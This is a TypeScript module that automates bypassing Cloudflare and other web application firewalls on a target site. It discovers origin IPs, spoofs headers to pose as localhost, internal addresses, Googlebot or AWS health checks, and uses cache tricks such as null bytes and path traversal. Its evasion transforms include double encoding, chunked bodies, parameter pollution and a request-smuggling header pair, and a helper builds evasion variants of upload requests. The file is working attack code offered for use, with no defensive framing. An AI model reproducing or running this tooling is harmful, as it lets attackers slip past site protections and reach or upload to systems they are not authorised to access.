/**
 * Unified Cloudflare Bypass Module
 * 
 * Combines multiple CF/WAF bypass techniques into a single module:
 *   Technique 1: Origin IP Discovery (delegates to cf-origin-bypass.ts)
 *   Technique 2: Header Manipulation (CF-Connecting-IP, X-Forwarded-For spoofing)
 *   Technique 3: Cache-based Bypass (cached pages, CDN edge bypass, cache poisoning)
 *   Technique 4: WAF Rule Evasion (encoding tricks, chunked transfer, parameter pollution)
 * 
 * Usage:
 *   const result = await runCfBypass(targetUrl, options);
 *   if (result.bypassed) {
 *     // Use result.originIp or result.bypassHeaders for direct access
 *   }
 */

import { findOriginIP, fetchViaOriginIP, type OriginIPResult, type OriginCandidate } from "./cf-origin-bypass";
import { detectWaf, getEvasionStrategy, applyEvasionToPayload, type WafDetectionResult, type EvasionStrategy } from "./waf-detector";
import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface CfBypassConfig {
  targetUrl: string;
  timeout?: number;
  enableOriginDiscovery?: boolean;
  enableHeaderManipulation?: boolean;
  enableCacheBypass?: boolean;
  enableWafEvasion?: boolean;
  onProgress?: (technique: string, detail: string) => void;
}

export interface CfBypassResult {
  bypassed: boolean;
  techniques: TechniqueResult[];
  originIp: string | null;
  bypassHeaders: Record<string, string>;
  bestTechnique: string | null;
  wafDetection: WafDetectionResult | null;
  evasionStrategy: EvasionStrategy | null;
  duration: number;
}

export interface TechniqueResult {
  name: string;
  success: boolean;
  detail: string;
  data?: any;
  duration: number;
}

export interface BypassFetchOptions {
  method?: string;
  body?: string | Buffer;
  headers?: Record<string, string>;
  timeout?: number;
}

// ═══════════════════════════════════════════════════════
//  HEADER MANIPULATION PROFILES
// ═══════════════════════════════════════════════════════

const HEADER_BYPASS_PROFILES: Array<{
  name: string;
  headers: Record<string, string>;
  description: string;
}> = [
  {
    name: "cf_worker_spoof",
    headers: {
      "CF-Connecting-IP": "127.0.0.1",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
      "True-Client-IP": "127.0.0.1",
    },
    description: "Spoof as localhost via CF headers — some origins trust these headers blindly",
  },
  {
    name: "internal_network_spoof",
    headers: {
      "X-Forwarded-For": "10.0.0.1",
      "X-Real-IP": "10.0.0.1",
      "X-Originating-IP": "10.0.0.1",
      "X-Remote-IP": "10.0.0.1",
      "X-Remote-Addr": "10.0.0.1",
      "X-Client-IP": "10.0.0.1",
    },
    description: "Spoof as internal network IP — bypasses IP-based ACLs",
  },
  {
    name: "google_bot_spoof",
    headers: {
      "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "X-Forwarded-For": "66.249.66.1",
      "From": "googlebot(at)googlebot.com",
    },
    description: "Spoof as Googlebot — many WAFs whitelist search engine crawlers",
  },
  {
    name: "cloudflare_worker_spoof",
    headers: {
      "CF-Worker": "true",
      "CF-Access-Client-Id": "internal",
      "CF-Access-Client-Secret": "internal",
      "X-Forwarded-Proto": "https",
    },
    description: "Spoof as CF Worker — may bypass WAF rules for internal traffic",
  },
  {
    name: "health_check_spoof",
    headers: {
      "User-Agent": "Amazon-Route53-Health-Check-Service",
      "X-Forwarded-For": "176.32.100.36",
    },
    description: "Spoof as AWS health check — often whitelisted",
  },
  {
    name: "cdn_purge_spoof",
    headers: {
      "X-Purge-Key": "bypass",
      "Fastly-Purge": "1",
      "X-Varnish-Purge": "1",
      "Surrogate-Control": "no-store",
    },
    description: "CDN purge headers — may bypass cache and WAF layers",
  },
];

// ═══════════════════════════════════════════════════════
//  CACHE BYPASS TECHNIQUES
// ═══════════════════════════════════════════════════════

function generateCacheBypassUrls(baseUrl: string): Array<{ url: string; name: string; description: string }> {
  const ts = Date.now();
  const rand = Math.random().toString(36).slice(2, 8);
  const parsed = new URL(baseUrl);
  const base = parsed.origin;
  const path = parsed.pathname;

  return [
    {
      url: `${base}${path}?_=${ts}`,
      name: "cache_buster_timestamp",
      description: "Cache-busting with timestamp query param",
    },
    {
      url: `${base}${path}?cb=${rand}&nocache=1`,
      name: "cache_buster_random",
      description: "Random cache-busting query params",
    },
    {
      url: `${base}${path}%00`,
      name: "null_byte_path",
      description: "Null byte in path — may bypass cache matching",
    },
    {
      url: `${base}${path}/../${path.replace(/^\//, "")}`,
      name: "path_traversal_normalize",
      description: "Path traversal normalization — cache sees different key",
    },
    {
      url: `${base}${path}?__cf_chl_tk=bypass`,
      name: "cf_challenge_token",
      description: "Fake CF challenge token — may skip challenge page",
    },
    {
      url: `${base}${path}`,
      name: "accept_encoding_bypass",
      description: "Request with no Accept-Encoding — may get uncached response",
    },
    {
      url: `${base}${path}/.`,
      name: "dot_suffix",
      description: "Trailing dot in path — different cache key, same resource",
    },
    {
      url: `${base}${path};`,
      name: "semicolon_suffix",
      description: "Semicolon path suffix — Apache/Tomcat path parameter bypass",
    },
  ];
}

// ═══════════════════════════════════════════════════════
//  WAF RULE EVASION PAYLOADS
// ═══════════════════════════════════════════════════════

export interface WafEvasionTechnique {
  name: string;
  description: string;
  transformUrl: (url: string) => string;
  transformHeaders: (headers: Record<string, string>) => Record<string, string>;
  transformBody?: (body: string) => string;
}

const WAF_EVASION_TECHNIQUES: WafEvasionTechnique[] = [
  {
    name: "double_url_encoding",
    description: "Double URL-encode path components to bypass pattern matching",
    transformUrl: (url) => {
      const parsed = new URL(url);
      // Double-encode the path
      const encodedPath = parsed.pathname
        .split("/")
        .map(seg => seg ? encodeURIComponent(encodeURIComponent(seg)) : "")
        .join("/");
      return `${parsed.origin}${encodedPath}${parsed.search}`;
    },
    transformHeaders: (h) => h,
  },
  {
    name: "chunked_transfer",
    description: "Use Transfer-Encoding: chunked to split payload across chunks",
    transformUrl: (url) => url,
    transformHeaders: (h) => ({
      ...h,
      "Transfer-Encoding": "chunked",
    }),
    transformBody: (body) => {
      // Split body into small chunks
      const chunkSize = 32;
      let chunked = "";
      for (let i = 0; i < body.length; i += chunkSize) {
        const chunk = body.slice(i, i + chunkSize);
        chunked += `${chunk.length.toString(16)}\r\n${chunk}\r\n`;
      }
      chunked += "0\r\n\r\n";
      return chunked;
    },
  },
  {
    name: "content_type_confusion",
    description: "Use unexpected Content-Type to bypass body inspection",
    transformUrl: (url) => url,
    transformHeaders: (h) => ({
      ...h,
      "Content-Type": "application/x-www-form-urlencoded; charset=ibm500",
    }),
  },
  {
    name: "http_method_override",
    description: "Use X-HTTP-Method-Override to disguise actual method",
    transformUrl: (url) => url,
    transformHeaders: (h) => ({
      ...h,
      "X-HTTP-Method-Override": "PUT",
      "X-Method-Override": "PUT",
    }),
  },
  {
    name: "parameter_pollution",
    description: "HTTP Parameter Pollution — duplicate params confuse WAF parsers",
    transformUrl: (url) => {
      const parsed = new URL(url);
      // Add duplicate parameters
      parsed.searchParams.append("action", "upload");
      parsed.searchParams.append("action", "view");
      parsed.searchParams.append("cmd", "");
      parsed.searchParams.append("cmd", "upload");
      return parsed.toString();
    },
    transformHeaders: (h) => h,
  },
  {
    name: "unicode_normalization",
    description: "Use Unicode characters that normalize to ASCII — bypasses string matching",
    transformUrl: (url) => {
      // Replace common characters with Unicode equivalents
      return url
        .replace(/\//g, "\uFF0F")  // Fullwidth solidus
        .replace("://", "://")     // Keep protocol
        .replace(/\uFF0F\uFF0F/, "//"); // Keep double slash after protocol
    },
    transformHeaders: (h) => h,
  },
  {
    name: "multipart_boundary_trick",
    description: "Use unusual multipart boundary to confuse WAF parser",
    transformUrl: (url) => url,
    transformHeaders: (h) => ({
      ...h,
      "Content-Type": `multipart/form-data; boundary=----=_Part_${Date.now()}_${Math.random().toString(36).slice(2)}; charset=utf-8`,
    }),
  },
  {
    name: "request_smuggling_hint",
    description: "Add conflicting Content-Length and Transfer-Encoding headers",
    transformUrl: (url) => url,
    transformHeaders: (h) => ({
      ...h,
      "Transfer-Encoding": "chunked",
      "Content-Length": "0",
    }),
  },
];

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 1: ORIGIN IP DISCOVERY
// ═══════════════════════════════════════════════════════

async function technique1_OriginIPDiscovery(
  domain: string,
  timeout: number,
  log: (msg: string) => void,
): Promise<TechniqueResult> {
  const start = Date.now();
  try {
    const result = await Promise.race([
      findOriginIP(domain, log),
      new Promise<OriginIPResult>((_, reject) =>
        setTimeout(() => reject(new Error("Origin IP discovery timeout")), timeout)
      ),
    ]);

    if (result.found && result.originIP) {
      return {
        name: "origin_ip_discovery",
        success: true,
        detail: `Origin IP found: ${result.originIP} (source: ${result.method}, confidence: ${result.confidence}%, verified: ${result.verified})`,
        data: result,
        duration: Date.now() - start,
      };
    }

    // Return best candidate even if not verified
    if (result.allCandidates.length > 0) {
      const best = result.allCandidates.sort((a, b) => b.confidence - a.confidence)[0];
      return {
        name: "origin_ip_discovery",
        success: true,
        detail: `Origin IP candidate: ${best.ip} (source: ${best.source}, confidence: ${best.confidence}%, unverified)`,
        data: { ...result, originIP: best.ip, verified: false },
        duration: Date.now() - start,
      };
    }

    return {
      name: "origin_ip_discovery",
      success: false,
      detail: `No origin IP candidates found after ${result.allCandidates.length} methods`,
      data: result,
      duration: Date.now() - start,
    };
  } catch (e: any) {
    return {
      name: "origin_ip_discovery",
      success: false,
      detail: `Origin IP discovery failed: ${e.message}`,
      duration: Date.now() - start,
    };
  }
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 2: HEADER MANIPULATION
// ═══════════════════════════════════════════════════════

async function technique2_HeaderManipulation(
  targetUrl: string,
  timeout: number,
  log: (msg: string) => void,
): Promise<TechniqueResult> {
  const start = Date.now();
  const successfulProfiles: string[] = [];
  let bestHeaders: Record<string, string> = {};

  for (const profile of HEADER_BYPASS_PROFILES) {
    try {
      log(`Testing header profile: ${profile.name} — ${profile.description}`);
      
      const res = await Promise.race([
        fetchWithPoolProxy(targetUrl, {
          method: "GET",
          headers: {
            ...profile.headers,
            "Accept": "text/html,application/xhtml+xml",
          },
          signal: AbortSignal.timeout(Math.min(timeout, 10000)),
        }, { targetDomain: new URL(targetUrl).hostname, timeout: 10000 }),
        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("timeout")), 10000)),
      ]);

      const status = res.response.status;
      // Success if we get 200 (not 403/503 challenge page)
      if (status >= 200 && status < 400) {
        const body = await res.response.text().catch(() => "");
        // Check if it's a real page (not CF challenge)
        const isCfChallenge = body.includes("cf-browser-verification") || 
                              body.includes("Checking your browser") ||
                              body.includes("cf-challenge-running");
        
        if (!isCfChallenge) {
          successfulProfiles.push(profile.name);
          bestHeaders = { ...profile.headers };
          log(`✅ Header profile ${profile.name} bypassed WAF! (HTTP ${status})`);
        } else {
          log(`⚠️ Header profile ${profile.name}: HTTP ${status} but CF challenge detected`);
        }
      } else {
        log(`❌ Header profile ${profile.name}: HTTP ${status}`);
      }
    } catch (e: any) {
      log(`❌ Header profile ${profile.name}: ${e.message}`);
    }
  }

  return {
    name: "header_manipulation",
    success: successfulProfiles.length > 0,
    detail: successfulProfiles.length > 0
      ? `${successfulProfiles.length} header profiles bypassed WAF: ${successfulProfiles.join(", ")}`
      : "No header manipulation profiles bypassed WAF",
    data: { successfulProfiles, bestHeaders },
    duration: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 3: CACHE-BASED BYPASS
// ═══════════════════════════════════════════════════════

async function technique3_CacheBypass(
  targetUrl: string,
  timeout: number,
  log: (msg: string) => void,
): Promise<TechniqueResult> {
  const start = Date.now();
  const successfulTechniques: string[] = [];
  let bestUrl = "";

  const cacheUrls = generateCacheBypassUrls(targetUrl);

  for (const technique of cacheUrls) {
    try {
      log(`Testing cache bypass: ${technique.name} — ${technique.description}`);

      const headers: Record<string, string> = {
        "Accept": "text/html,application/xhtml+xml",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
      };

      // Special handling for accept_encoding_bypass
      if (technique.name === "accept_encoding_bypass") {
        // Don't send Accept-Encoding header
      } else {
        headers["Accept-Encoding"] = "gzip, deflate";
      }

      const res = await Promise.race([
        fetchWithPoolProxy(technique.url, {
          method: "GET",
          headers,
          signal: AbortSignal.timeout(Math.min(timeout, 8000)),
        }, { targetDomain: new URL(targetUrl).hostname, timeout: 8000 }),
        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("timeout")), 8000)),
      ]);

      const status = res.response.status;
      if (status >= 200 && status < 400) {
        const body = await res.response.text().catch(() => "");
        const isCfChallenge = body.includes("cf-browser-verification") || 
                              body.includes("Checking your browser") ||
                              body.includes("cf-challenge-running");

        if (!isCfChallenge) {
          successfulTechniques.push(technique.name);
          bestUrl = technique.url;
          log(`✅ Cache bypass ${technique.name} worked! (HTTP ${status})`);
        } else {
          log(`⚠️ Cache bypass ${technique.name}: HTTP ${status} but CF challenge`);
        }
      } else {
        log(`❌ Cache bypass ${technique.name}: HTTP ${status}`);
      }
    } catch (e: any) {
      log(`❌ Cache bypass ${technique.name}: ${e.message}`);
    }
  }

  return {
    name: "cache_bypass",
    success: successfulTechniques.length > 0,
    detail: successfulTechniques.length > 0
      ? `${successfulTechniques.length} cache bypass techniques worked: ${successfulTechniques.join(", ")}`
      : "No cache bypass techniques worked",
    data: { successfulTechniques, bestUrl },
    duration: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 4: WAF RULE EVASION
// ═══════════════════════════════════════════════════════

async function technique4_WafRuleEvasion(
  targetUrl: string,
  timeout: number,
  log: (msg: string) => void,
): Promise<TechniqueResult> {
  const start = Date.now();
  const successfulTechniques: string[] = [];
  let bestTechnique: WafEvasionTechnique | null = null;

  for (const technique of WAF_EVASION_TECHNIQUES) {
    try {
      log(`Testing WAF evasion: ${technique.name} — ${technique.description}`);

      const transformedUrl = technique.transformUrl(targetUrl);
      const transformedHeaders = technique.transformHeaders({
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Encoding": "gzip, deflate",
      });

      const res = await Promise.race([
        fetchWithPoolProxy(transformedUrl, {
          method: "GET",
          headers: transformedHeaders,
          signal: AbortSignal.timeout(Math.min(timeout, 8000)),
        }, { targetDomain: new URL(targetUrl).hostname, timeout: 8000 }),
        new Promise<never>((_, reject) => setTimeout(() => reject(new Error("timeout")), 8000)),
      ]);

      const status = res.response.status;
      if (status >= 200 && status < 400) {
        const body = await res.response.text().catch(() => "");
        const isCfChallenge = body.includes("cf-browser-verification") || 
                              body.includes("Checking your browser") ||
                              body.includes("cf-challenge-running");

        if (!isCfChallenge) {
          successfulTechniques.push(technique.name);
          if (!bestTechnique) bestTechnique = technique;
          log(`✅ WAF evasion ${technique.name} worked! (HTTP ${status})`);
        } else {
          log(`⚠️ WAF evasion ${technique.name}: HTTP ${status} but CF challenge`);
        }
      } else {
        log(`❌ WAF evasion ${technique.name}: HTTP ${status}`);
      }
    } catch (e: any) {
      log(`❌ WAF evasion ${technique.name}: ${e.message}`);
    }
  }

  return {
    name: "waf_rule_evasion",
    success: successfulTechniques.length > 0,
    detail: successfulTechniques.length > 0
      ? `${successfulTechniques.length} WAF evasion techniques worked: ${successfulTechniques.join(", ")}`
      : "No WAF evasion techniques worked",
    data: { successfulTechniques, bestTechnique: bestTechnique?.name || null },
    duration: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  MAIN: RUN ALL CF BYPASS TECHNIQUES
// ═══════════════════════════════════════════════════════

export async function runCfBypass(config: CfBypassConfig): Promise<CfBypassResult> {
  const start = Date.now();
  const timeout = config.timeout || 60000;
  const log = config.onProgress || (() => {});
  const techniques: TechniqueResult[] = [];
  let originIp: string | null = null;
  let bypassHeaders: Record<string, string> = {};
  let bestTechnique: string | null = null;

  const domain = (() => {
    try { return new URL(config.targetUrl).hostname; }
    catch { return config.targetUrl; }
  })();

  // Step 0: Detect WAF first
  let wafDetection: WafDetectionResult | null = null;
  let evasionStrategy: EvasionStrategy | null = null;

  try {
    log("waf_detect", `🛡️ Detecting WAF on ${domain}...`);
    wafDetection = await Promise.race([
      detectWaf(config.targetUrl),
      new Promise<WafDetectionResult>((_, reject) =>
        setTimeout(() => reject(new Error("WAF detection timeout")), 15000)
      ),
    ]);

    if (wafDetection.detected) {
      evasionStrategy = getEvasionStrategy(wafDetection);
      log("waf_detect", `🛡️ WAF detected: ${wafDetection.wafName} (${wafDetection.confidence} confidence, ${wafDetection.strength} strength)`);
    } else {
      log("waf_detect", `✅ No WAF detected — bypass may not be needed`);
    }
  } catch (e: any) {
    log("waf_detect", `⚠️ WAF detection failed: ${e.message}`);
  }

  // Technique 1: Origin IP Discovery
  if (config.enableOriginDiscovery !== false) {
    log("origin_ip", `🎯 Technique 1: Origin IP Discovery...`);
    const result = await technique1_OriginIPDiscovery(domain, Math.min(timeout, 90000), (msg) => log("origin_ip", msg));
    techniques.push(result);

    if (result.success && result.data?.originIP) {
      originIp = result.data.originIP;
      bestTechnique = "origin_ip_discovery";
      log("origin_ip", `🎯 Origin IP: ${originIp}`);
    }
  }

  // Technique 2: Header Manipulation
  if (config.enableHeaderManipulation !== false) {
    log("header_manipulation", `🔧 Technique 2: Header Manipulation...`);
    const result = await technique2_HeaderManipulation(config.targetUrl, Math.min(timeout, 60000), (msg) => log("header_manipulation", msg));
    techniques.push(result);

    if (result.success && result.data?.bestHeaders) {
      bypassHeaders = { ...bypassHeaders, ...result.data.bestHeaders };
      if (!bestTechnique) bestTechnique = "header_manipulation";
    }
  }

  // Technique 3: Cache-based Bypass
  if (config.enableCacheBypass !== false) {
    log("cache_bypass", `📦 Technique 3: Cache-based Bypass...`);
    const result = await technique3_CacheBypass(config.targetUrl, Math.min(timeout, 40000), (msg) => log("cache_bypass", msg));
    techniques.push(result);

    if (result.success) {
      if (!bestTechnique) bestTechnique = "cache_bypass";
    }
  }

  // Technique 4: WAF Rule Evasion
  if (config.enableWafEvasion !== false) {
    log("waf_evasion", `🛡️ Technique 4: WAF Rule Evasion...`);
    const result = await technique4_WafRuleEvasion(config.targetUrl, Math.min(timeout, 40000), (msg) => log("waf_evasion", msg));
    techniques.push(result);

    if (result.success) {
      if (!bestTechnique) bestTechnique = "waf_rule_evasion";
    }
  }

  const bypassed = techniques.some(t => t.success);

  return {
    bypassed,
    techniques,
    originIp,
    bypassHeaders,
    bestTechnique,
    wafDetection,
    evasionStrategy,
    duration: Date.now() - start,
  };
}

// ═══════════════════════════════════════════════════════
//  HELPER: FETCH WITH CF BYPASS
// ═══════════════════════════════════════════════════════

/**
 * Fetch a URL using the best available CF bypass technique.
 * Tries: origin IP direct → header manipulation → cache bypass → normal fetch
 */
export async function fetchWithCfBypass(
  url: string,
  bypassResult: CfBypassResult,
  options: BypassFetchOptions = {},
): Promise<{ response: Response; method: string }> {
  const domain = (() => {
    try { return new URL(url).hostname; }
    catch { return ""; }
  })();
  const timeout = options.timeout || 15000;

  // Strategy 1: Use origin IP if available
  if (bypassResult.originIp) {
    try {
      const originUrl = url.replace(
        /^(https?:\/\/)[^/]+/,
        `http://${bypassResult.originIp}`,
      );
      const res = await fetchWithPoolProxy(originUrl, {
        method: options.method || "GET",
        body: options.body as any,
        headers: {
          ...options.headers,
          "Host": domain,
          "X-Forwarded-For": "1.1.1.1",
          "X-Real-IP": "1.1.1.1",
        },
        signal: AbortSignal.timeout(timeout),
      }, { targetDomain: bypassResult.originIp, timeout });

      if (res.response.status < 400) {
        return { response: res.response, method: "origin_ip" };
      }
    } catch { /* fallthrough */ }
  }

  // Strategy 2: Use bypass headers
  if (Object.keys(bypassResult.bypassHeaders).length > 0) {
    try {
      const res = await fetchWithPoolProxy(url, {
        method: options.method || "GET",
        body: options.body as any,
        headers: {
          ...options.headers,
          ...bypassResult.bypassHeaders,
        },
        signal: AbortSignal.timeout(timeout),
      }, { targetDomain: domain, timeout });

      if (res.response.status < 400) {
        return { response: res.response, method: "header_bypass" };
      }
    } catch { /* fallthrough */ }
  }

  // Strategy 3: Normal fetch as fallback
  const res = await fetchWithPoolProxy(url, {
    method: options.method || "GET",
    body: options.body as any,
    headers: options.headers,
    signal: AbortSignal.timeout(timeout),
  }, { targetDomain: domain, timeout });

  return { response: res.response, method: "direct" };
}

// ═══════════════════════════════════════════════════════
//  HELPER: APPLY EVASION TO UPLOAD REQUEST
// ═══════════════════════════════════════════════════════

/**
 * Transform an upload request using WAF evasion techniques.
 * Returns multiple variants to try in sequence.
 */
export function generateEvasionVariants(
  url: string,
  headers: Record<string, string>,
  body?: string,
): Array<{ url: string; headers: Record<string, string>; body?: string; technique: string }> {
  const variants: Array<{ url: string; headers: Record<string, string>; body?: string; technique: string }> = [];

  for (const technique of WAF_EVASION_TECHNIQUES) {
    try {
      const transformedUrl = technique.transformUrl(url);
      const transformedHeaders = technique.transformHeaders(headers);
      const transformedBody = body && technique.transformBody ? technique.transformBody(body) : body;

      variants.push({
        url: transformedUrl,
        headers: transformedHeaders,
        body: transformedBody,
        technique: technique.name,
      });
    } catch { /* skip broken transforms */ }
  }

  return variants;
}
